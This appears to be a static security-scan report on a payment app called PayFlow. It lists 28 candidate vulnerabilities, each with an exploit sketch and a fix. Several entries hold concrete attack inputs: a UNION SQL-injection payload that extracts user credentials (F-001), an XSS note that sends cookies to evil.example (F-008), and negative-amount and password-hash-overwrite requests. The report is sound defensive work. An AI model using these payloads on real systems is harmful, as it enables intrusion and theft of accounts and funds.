# VULN-FINDINGS: PayFlow

Static vulnerability scan. Scanned 94 non-test source files (backend/src + frontend/src) across 9 focus areas. **These are static candidates, not verified findings** — run `/triage VULN-FINDINGS.json --repo .` next.

Scanned at: 2026-09-28T11:26:42Z
Focus areas: authorization/IDOR, SQL injection, CORS/CSRF, auth & session security, wallet/transfer business logic, client-side tokens & XSS, error handling/info disclosure, input validation coverage, supply chain & dev infra.

**Summary: 28 findings — 15 HIGH / 6 MEDIUM / 7 LOW, 7 low-confidence (<0.4).**

## Summary table

| id | severity | confidence | category | file:line | title |
|---|---|---|---|---|---|
| F-001 | HIGH | 0.98 | sql-injection | transactions/transactions.service.ts:120 | Unvalidated `q` interpolated into raw SQL via $queryRawUnsafe |
| F-002 | HIGH | 0.95 | weak-crypto | auth/password.ts:3 | Passwords hashed with unsalted, unstretched SHA-256 |
| F-003 | HIGH | 0.95 | idor | beneficiaries/beneficiaries.service.ts:42 | deleteBeneficiary deletes any beneficiary regardless of owner |
| F-004 | HIGH | 0.95 | business-logic | transfers/transfers.schemas.ts:11 | Missing positive-amount validation allows negative-amount transfer |
| F-005 | HIGH | 0.92 | idor | transactions/transactions.service.ts:143 | getTransactionById fetches any transaction with no ownership filter |
| F-006 | HIGH | 0.9 | information-disclosure | middleware/errorHandler.ts:14 | Unconditional leak of raw error message + stack trace |
| F-007 | HIGH | 0.9 | missing-rate-limit | middleware/rateLimit.ts:8 | authLimiter defined but never applied to any route |
| F-008 | HIGH | 0.9 | xss | pages/TransactionDetailPage.tsx:62 | Stored XSS via transaction note in dangerouslySetInnerHTML |
| F-009 | MEDIUM | 0.9 | user-enumeration | auth/auth.service.ts:60 | Login distinguishes unknown-email vs wrong-password |
| F-010 | HIGH | 0.85 | csrf | middleware/verifyOrigin.ts:1 | verifyOrigin CSRF middleware implemented but never registered |
| F-011 | HIGH | 0.85 | mass-assignment | users/users.schemas.ts:5 | .passthrough() lets attacker overwrite passwordHash/email |
| F-012 | HIGH | 0.85 | broken-session-management | users/users.service.ts:57 | changePassword never revokes existing sessions |
| F-013 | HIGH | 0.85 | sensitive-data-exposure | features/auth/authApi.ts:19 | Access token duplicated into localStorage |
| F-014 | HIGH | 0.8 | excessive-data-exposure | transfers/transfers.service.ts:40 | lookupRecipient returns another user's email/phone/balance |
| F-015 | MEDIUM | 0.8 | sensitive-data-exposure | auth/auth.controller.ts:20 | Access token returned in JSON body in addition to cookie |
| F-016 | HIGH | 0.75 | race-condition | transfers/transfers.service.ts:69 | TOCTOU race between balance check and debit |
| F-017 | MEDIUM | 0.6 | over-privileged-credential | scripts/setup-db.sh:30 | App runtime DB role granted CREATEDB |
| F-018 | HIGH | 0.55 | cors-misconfiguration | app.ts:32 | CORS reflects any Origin with credentials:true |
| F-019 | MEDIUM | 0.55 | supply-chain | backend/package.json:26 | jsonwebtoken pinned to 8.5.1 (pre-fix CVEs) |
| F-020 | LOW | 0.5 | user-enumeration | auth/auth.service.ts:20 | Registration reveals which of email/phone exists |
| F-021 | MEDIUM | 0.45 | missing-rate-limit | app.ts:20 | trust proxy:1 + IP-keyed rate limit vulnerable to XFF spoofing |
| F-022 | MEDIUM | 0.4 | business-logic | wallets/wallets.service.ts:67 | No idempotency protection on transfer/top-up |
| F-023 | LOW | 0.3 | business-logic | transfers/transfers.service.ts:58 | Wallet ACTIVE status not re-verified at debit/credit |
| F-024 | LOW | 0.3 | csrf | middleware/verifyOrigin.ts:20 | verifyOrigin fails open when Origin header absent |
| F-025 | LOW | 0.3 | weak-validation | auth/auth.schemas.ts:16 | Email fields have no max-length bound |
| F-026 | LOW | 0.3 | weak-crypto | auth/password.ts:9 | Password comparison uses non-constant-time === |
| F-027 | LOW | 0.3 | sensitive-data-in-logs | lib/logger.ts:7 | Redaction list omits token/secret field names |
| F-028 | LOW | 0.25 | sensitive-data-in-logs | auth/auth.service.ts:65 | LOGIN_FAILURE logs raw email, no read endpoint (latent) |

---

### F-001 — Unvalidated `q` interpolated into raw SQL via $queryRawUnsafe
**backend/src/transactions/transactions.service.ts:120** · HIGH · confidence 0.98

searchTransactionsByDescription builds a raw SQL string by directly interpolating the caller-controlled `q` value into both a WHERE clause and an ILIKE pattern. The `/search` route has no `validate()` middleware, unlike its siblings, so no length cap or character filtering exists. Query result columns are serialized straight into the JSON response, supporting direct UNION-based extraction of arbitrary data from other tables.

**Exploit:** `GET /api/transactions/search?q=x') UNION SELECT id, email, password, 'x','x','x','x', "createdAt" FROM users --` exfiltrates other users' credentials/PII directly in the response. `q=' OR '1'='1` bypasses the wallet-ownership filter entirely.

**Fix:** Use Prisma's parameterized `$queryRaw` tagged template instead of `$queryRawUnsafe`; add `validate()` with a max-length bound on `q`.

### F-002 — Passwords hashed with unsalted, unstretched SHA-256
**backend/src/auth/password.ts:3** · HIGH · confidence 0.95

`hashPassword` computes `sha256(plainPassword)` with no salt and no work factor. Every register/changePassword call persists this digest as `passwordHash`.

**Exploit:** If the user DB is exfiltrated (e.g. via F-001), an attacker cracks passwords offline at billions of guesses/sec on commodity GPUs; no salt enables rainbow-table attacks across all users at once.

**Fix:** Replace with argon2id or bcrypt with a per-user salt and tuned cost factor; migrate hashes lazily on next login.

### F-003 — deleteBeneficiary deletes any beneficiary regardless of owner
**backend/src/beneficiaries/beneficiaries.service.ts:42** · HIGH · confidence 0.95

`deleteBeneficiary(_callerUserId, id)` never uses the caller's id — `prisma.beneficiary.delete({ where: { id } })` has no ownership filter.

**Exploit:** User A calls `DELETE /api/beneficiaries/{id}` with a UUID belonging to User B; the record is deleted from B's account.

**Fix:** Scope the delete: `deleteMany({ where: { id, ownerUserId: callerUserId } })`, check `count === 0`.

### F-004 — Missing positive-amount validation allows negative-amount transfer
**backend/src/transfers/transfers.schemas.ts:11** · HIGH · confidence 0.95

`createTransferSchema.amount` has only `.max(500000)`, no `.positive()`. A negative amount trivially passes the balance check and inverts the Prisma decrement/increment operations, crediting the sender and debiting the receiver.

**Exploit:** `POST /api/transfers { "identifier": "victim@example.com", "amount": -5000 }` from a $0-balance account drains funds from any known user.

**Fix:** Add `.positive()` and a decimal-place refine matching `addMoneySchema`'s policy; assert `amount > 0` defensively inside `createTransfer` too.

### F-005 — getTransactionById fetches any transaction with no ownership filter
**backend/src/transactions/transactions.service.ts:143** · HIGH · confidence 0.92

The Prisma query filters only by the transaction's primary key, not by sender/receiver wallet matching the caller.

**Exploit:** `GET /api/transactions/{id}` with any valid UUID (from a shared receipt, leaked log, or enumeration) returns full detail for a transaction between two other users.

**Fix:** Add `OR: [{ senderWalletId: wallet.id }, { receiverWalletId: wallet.id }]` to the query; 404 on no match.

### F-006 — Unconditional leak of raw error message + stack trace
**backend/src/middleware/errorHandler.ts:14** · HIGH · confidence 0.9

The fallback exception handler returns `err.message` and `err.stack` verbatim in the JSON body with no `isProduction` gate, for any uncaught exception from any controller.

**Exploit:** Any exception not already converted to an `ApiError` (a Prisma edge case, a programming bug) discloses absolute file paths, internal module structure, and library versions.

**Fix:** Gate `message`/`stack` inclusion behind `!isProduction`; the full error is already logged server-side.

### F-007 — authLimiter defined but never applied to any route
**backend/src/middleware/rateLimit.ts:8** · HIGH · confidence 0.9

`authLimiter` (10 req/15min) is exported but never imported anywhere else. Auth routes get only the generic 300 req/15min `apiLimiter`.

**Exploit:** An attacker sends up to 300 login attempts per 15-minute window for credential stuffing or brute force — far above the intended 10-per-15min limit.

**Fix:** Apply `authLimiter` explicitly on `/register`, `/login`, `/refresh`.

### F-008 — Stored XSS via transaction note in dangerouslySetInnerHTML
**frontend/src/pages/TransactionDetailPage.tsx:62** · HIGH · confidence 0.9

The sender-controlled transfer `note` is stored verbatim and rendered via `dangerouslySetInnerHTML` with no sanitization anywhere in the codebase.

**Exploit:** A transfer note of `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">` executes in the victim's browser when they view the transaction, enabling authenticated `fetch()` calls against the app's API and token exfiltration (see F-013).

**Fix:** Render as plain text (React auto-escapes) or sanitize with DOMPurify before using `dangerouslySetInnerHTML`.

### F-009 — Login distinguishes unknown-email vs wrong-password
**backend/src/auth/auth.service.ts:60** · MEDIUM · confidence 0.9

Distinct error codes (`ACCOUNT_NOT_FOUND` vs `INCORRECT_PASSWORD`) let an attacker enumerate registered emails via the login endpoint.

**Fix:** Return an identical generic error and perform a dummy hash computation on the unknown-user path to also equalize timing.

### F-010 — verifyOrigin CSRF middleware implemented but never registered
**backend/src/middleware/verifyOrigin.ts:1** · HIGH · confidence 0.85

The Origin-check CSRF defense exists in code but is never `app.use()`'d. Only cookie `sameSite` attributes provide any CSRF protection today.

**Fix:** Wire `verifyOrigin` into the middleware chain in `app.ts` before the routers; add a regression test.

### F-011 — .passthrough() lets attacker overwrite passwordHash/email
**backend/src/users/users.schemas.ts:5** · HIGH · confidence 0.85

`updateProfileSchema.passthrough()` allows arbitrary extra fields through validation, which are then spread directly into `prisma.user.update`. Since `User` has real `email`/`passwordHash` columns, those field names survive and get written.

**Exploit:** `PATCH /api/users/me { "passwordHash": "$2b$10$<attacker-hash>" }` overwrites the victim's password hash without their current password.

**Fix:** Remove `.passthrough()`; build the Prisma `data` object from an explicit allow-list of fields.

### F-012 — changePassword never revokes existing sessions
**backend/src/users/users.service.ts:57** · HIGH · confidence 0.85

`changePassword` never calls `revokeAllRefreshTokensForUser`, which exists specifically for this purpose (per its own doc comment) but is only wired into the reuse-detection path.

**Exploit:** A victim's stolen refresh token continues working after they "secure" their account by changing password, for up to the remaining refresh-token TTL (default 14 days).

**Fix:** Call `revokeAllRefreshTokensForUser(userId)` inside `changePassword` after updating the hash.

### F-013 — Access token duplicated into localStorage
**frontend/src/features/auth/authApi.ts:19** · HIGH · confidence 0.85

Despite the app's stated "no token touches JS" design, both register and login write the access token into `localStorage`, where it's never read back but remains XSS-readable.

**Fix:** Remove both `localStorage.setItem` calls; rely solely on the httpOnly cookie.

### F-014 — lookupRecipient returns another user's email/phone/balance
**backend/src/transfers/transfers.service.ts:40** · HIGH · confidence 0.8

Any authenticated user who knows/guesses an identifier gets back the target's name, email, phone, and live wallet balance — no relationship or consent check.

**Fix:** Return only what's needed to confirm a transfer target (e.g. masked name); drop balance/phone/email from the response.

### F-015 — Access token returned in JSON body in addition to cookie
**backend/src/auth/auth.controller.ts:20** · MEDIUM · confidence 0.8

Register/login return `accessToken` in the JSON body on top of the httpOnly cookie, observable by any script intercepting the fetch/XHR response.

**Fix:** Return only `{ user }` for the web flow; serve tokens to non-cookie clients via a distinct endpoint if genuinely needed.

### F-016 — TOCTOU race between balance check and debit
**backend/src/transfers/transfers.service.ts:69** · HIGH · confidence 0.75

The balance check reads a snapshot with no row lock, then an explicit 100ms sleep widens the window before the decrement executes — two concurrent transfers can both pass the check against the same starting balance.

**Exploit:** Two concurrent transfers of a wallet's full balance to different recipients both succeed, manufacturing currency system-wide (double-spend).

**Fix:** Use a single conditional UPDATE (`WHERE balance >= amount`) or `SELECT ... FOR UPDATE` / serializable isolation with retry; add a DB-level `CHECK (balance >= 0)`.

### F-017 — App runtime DB role granted CREATEDB
**scripts/setup-db.sh:30** · MEDIUM · confidence 0.6

The single `payflow` Postgres role used by the running app also has CREATEDB, needed only for Prisma's dev shadow-DB workflow.

**Fix:** Split into a migration-only role (with CREATEDB) and an unprivileged runtime role.

### F-018 — CORS reflects any Origin with credentials:true
**backend/src/app.ts:32** · HIGH · confidence 0.55

`cors({ origin: true, credentials: true })` reflects any Origin header with no production gate; `env.CORS_ORIGIN` is defined but unused.

**Fix:** Replace with an explicit allowlist from `CORS_ORIGIN`, gated behind `!isProduction`.

### F-019 — jsonwebtoken pinned to 8.5.1 (pre-fix CVEs)
**backend/package.json:26** · MEDIUM · confidence 0.55

Carries CVE-2022-23540/23539/23529, fixed in 9.0.0. Current static-secret usage doesn't trigger the most severe (dynamic-key) vectors today, but the pin is one refactor away from real exposure.

**Fix:** Restore to `^9.0.3`; explicitly pass `algorithms: ['HS256']` to `jwt.verify()`.

### F-020 — Registration reveals which of email/phone exists
**backend/src/auth/auth.service.ts:20** · LOW · confidence 0.5

Distinct conflict messages for email vs phone let an attacker confirm account existence via `/register`.

**Fix:** Return a generic conflict message.

### F-021 — trust proxy:1 + IP-keyed rate limit vulnerable to XFF spoofing
**backend/src/app.ts:20** · MEDIUM · confidence 0.45

If the actual deployment doesn't have exactly one trusted proxy hop (unverified — no Dockerfile/reverse-proxy config exists), a client can spoof `X-Forwarded-For` to bypass IP-keyed rate limiting.

**Fix:** Verify/match the real proxy topology, or key rate limiting on a non-attacker-controlled value.

### F-022 — No idempotency protection on transfer/top-up
**backend/src/wallets/wallets.service.ts:67** · MEDIUM · confidence 0.4

Neither endpoint accepts an idempotency key; a client retry duplicates the money movement.

**Fix:** Accept and persist a client idempotency key within the same DB transaction as the balance mutation.

### F-023 — Wallet ACTIVE status not re-verified at debit/credit
**backend/src/transfers/transfers.service.ts:58** · LOW · confidence 0.3

Status is checked before the DB transaction but not re-verified immediately before the writes inside it.

**Fix:** Re-check status on the freshly-read rows inside the transaction callback.

### F-024 — verifyOrigin fails open when Origin header absent
**backend/src/middleware/verifyOrigin.ts:20** · LOW · confidence 0.3

Only rejects on a present-but-mismatched Origin; an absent header passes through. Currently moot since the middleware isn't wired in (F-010).

**Fix:** When activating, reject-by-default if Origin (or Referer fallback) is missing.

### F-025 — Email fields have no max-length bound
**backend/src/auth/auth.schemas.ts:16** · LOW · confidence 0.3

`z.email()` has no `.max()`, unlike sibling fields. Bounded somewhat by the global 32kb body-size cap.

**Fix:** Add `.max(254)`.

### F-026 — Password comparison uses non-constant-time ===
**backend/src/auth/password.ts:9** · LOW · confidence 0.3

A timing side channel layered on the already-weak SHA-256 hash (F-002); not demonstrated as practically exploitable remotely.

**Fix:** Use `crypto.timingSafeEqual`.

### F-027 — Redaction list omits token/secret field names
**backend/src/lib/logger.ts:7** · LOW · confidence 0.3

Pino's `redact.paths` doesn't cover `accessToken`/`refreshToken`/`tokenHash`/`secret`. No current code path logs these, so this is latent.

**Fix:** Extend the redaction list defensively.

### F-028 — LOGIN_FAILURE logs raw email, no read endpoint (latent)
**backend/src/auth/auth.service.ts:65** · LOW · confidence 0.25

Raw attempted-login email is stored in `AuditLog.metadata`, but no endpoint reads the audit log today.

**Fix:** No immediate action; mask if a read/export endpoint is ever added.
